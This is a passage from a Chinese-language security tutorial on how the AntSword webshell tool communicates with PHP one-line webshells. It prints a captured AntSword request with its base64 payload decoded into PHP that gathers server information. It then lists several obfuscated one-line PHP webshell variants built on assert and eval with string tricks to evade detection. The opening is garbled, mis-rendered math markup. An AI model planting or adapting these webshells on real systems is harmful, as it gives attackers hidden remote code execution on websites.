mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;opdir=@ini_get(&amp;quot;open_basedir&amp;quot;);if(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.036108em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15139200000000003em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;b&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;opdir) …(省略)… 就是蚁剑通过 shell 参数传递的参数内容，传递的这些参数是蚁剑能够控制后台的核心代码。&lt;/p&gt;
&lt;h4 id=&#34;连接方式二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#连接方式二&#34;&gt;#&lt;/a&gt; &lt;strong&gt;连接方式二：&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115545461.png&#34; alt=&#34;image-20221219115545461&#34;&gt;&lt;/p&gt;
&lt;p&gt;一定需要选择 base64 编码，因为蚁剑在处理 base64 时会做如下处理 &lt;code&gt;@eval(@base64_decode&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /uuuu.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 127.0.0.1:18888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: antSword/v2.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 949&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1=assert&amp;amp;2=%40eval(%40base64_decode(%24_POST%5B_0xe64103ac522dd%5D))%3B&amp;amp;_0xe64103ac522dd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTNjNDkiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjE1N2IyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;urldeocde&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1=assert&amp;amp;2=@eval(@base64_decode($_POST[_0xe64103ac522dd]));&amp;amp;_0xe64103ac522dd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTNjNDkiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjE1N2IyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;base64decode&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@ini_set(&amp;quot;display_errors&amp;quot;, &amp;quot;0&amp;quot;);@set_time_limit(0);function asenc($out)&amp;#123;return $out;&amp;#125;;function asoutput()&amp;#123;$output=ob_get_contents();ob_end_clean();echo &amp;quot;e3c49&amp;quot;;echo @asenc($output);echo &amp;quot;157b2&amp;quot;;&amp;#125;ob_start();try&amp;#123;$D=dirname($_SERVER[&amp;quot;SCRIPT_FILENAME&amp;quot;]);if($D==&amp;quot;&amp;quot;)$D=dirname($_SERVER[&amp;quot;PATH_TRANSLATED&amp;quot;]);$R=&amp;quot;&amp;#123;$D&amp;#125;	&amp;quot;;if(substr($D,0,1)!=&amp;quot;/&amp;quot;)&amp;#123;foreach(range(&amp;quot;C&amp;quot;,&amp;quot;Z&amp;quot;)as $L)if(is_dir(&amp;quot;&amp;#123;$L&amp;#125;:&amp;quot;))$R.=&amp;quot;&amp;#123;$L&amp;#125;:&amp;quot;;&amp;#125;else&amp;#123;$R.=&amp;quot;/&amp;quot;;&amp;#125;$R.=&amp;quot;	&amp;quot;;$u=(function_exists(&amp;quot;posix_getegid&amp;quot;))?@posix_getpwuid(@posix_geteuid()):&amp;quot;&amp;quot;;$s=($u)?$u[&amp;quot;name&amp;quot;]:@get_current_user();$R.=php_uname();$R.=&amp;quot;	&amp;#123;$s&amp;#125;&amp;quot;;echo $R;;&amp;#125;catch(Exception $e)&amp;#123;echo &amp;quot;ERROR://&amp;quot;.$e-&amp;gt;getMessage();&amp;#125;;asoutput();die();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当我们选择了 base64 编码的情况下蚁剑在连接密码的基础上添加了 eval 语句，并且对传输的变量 &lt;code&gt;_0xe64103ac522dd&lt;/code&gt;  进行了 base64 编码，当 php 执行 &lt;code&gt;_0xe64103ac522dd&lt;/code&gt;  里面携带的代码时，蚁剑即可获取和控制整个网站目录。&lt;/p&gt;
&lt;p&gt;如果不选择 base64 编码那么会变成 &lt;code&gt;0=assert&amp;amp;1=%40ini_set(%22display_errors&lt;/code&gt; ,assert 中执行的是函数，因此连接失败&lt;/p&gt;
&lt;h4 id=&#34;不能写成1eval2这种形式呢&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#不能写成1eval2这种形式呢&#34;&gt;#&lt;/a&gt; 不能写成 &lt;code&gt;1=eval&amp;amp;2&lt;/code&gt;  这种形式呢&lt;/h4&gt;
&lt;p&gt;原因是因为 eval 不能被可变函数调用&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//Fatal error: Call to undefined function eval()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eval函数中参数是字符，如：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(&amp;#x27;echo 1;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assert函数中参数为表达式 （或者为函数），如：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assert(phpinfo()) &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;php7中的assert&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php7中的assert&#34;&gt;#&lt;/a&gt; php7 中的 assert&lt;/h3&gt;
&lt;p&gt;php5 中 assert 是一个函数，我们可以通过 &lt;code&gt;$f=&#39;assert&#39;;$f(...);&lt;/code&gt;  这样的方法来动态执行任意代码。&lt;/p&gt;
&lt;p&gt;但 php7 中，assert 不再是函数，变成了一个语言结构（类似 eval），不能再作为函数名动态执行代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222160846771.png&#34; alt=&#34;image-20221222160846771&#34;&gt;&lt;/p&gt;
&lt;p&gt;而 eval 终究还是你 eval，永远是语言构造器&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eval(string `$code`): &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;把字符串  &lt;code&gt;code&lt;/code&gt;  作为 PHP 代码执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：因为是语言构造器而不是函数，不能被 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb25zLnZhcmlhYmxlLWZ1bmN0aW9ucy5waHA=&#34;&gt;可变函数&lt;/span&gt; 或者 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb25zLmFyZ3VtZW50cy5waHAjZnVuY3Rpb25zLm5hbWVkLWFyZ3VtZW50cw==&#34;&gt;命名参数&lt;/span&gt; 调用。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uZXZhbA==&#34;&gt;PHP: eval - Manual&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uYXNzZXJ0LnBocA==&#34;&gt;PHP: assert - Manual&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;php-一句话木马变形&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-一句话木马变形&#34;&gt;#&lt;/a&gt; php 一句话木马变形&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;php 变量&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = &amp;quot;assert&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a(@$_POST[&amp;#x27;shell&amp;#x27;]); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;php 变量简单变形 1&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&amp;quot;TR&amp;quot;.&amp;quot;Es&amp;quot;.&amp;quot;sA&amp;quot;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b=strtolower($a);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$c=strrev($b);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@$c($_POST[&amp;#x27;shell&amp;#x27;]);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;php 变量简单变形 2&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&amp;quot;AssERT&amp;quot;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b=strtolower($a);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@$b($_POST[&amp;#x27;shell&amp;#x27;]);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;PHP 可变变量&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$bb=&amp;quot;assert&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&amp;#x27;bb&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;$a&amp;#125;($_POST[&amp;#x27;shell&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;自定义函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;fun&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;title function_ invoke__&#34;&gt;fun&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;shell&amp;#x27;&lt;/span&gt;]);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;create_function 函数&lt;/strong&gt;&lt;/p&gt;
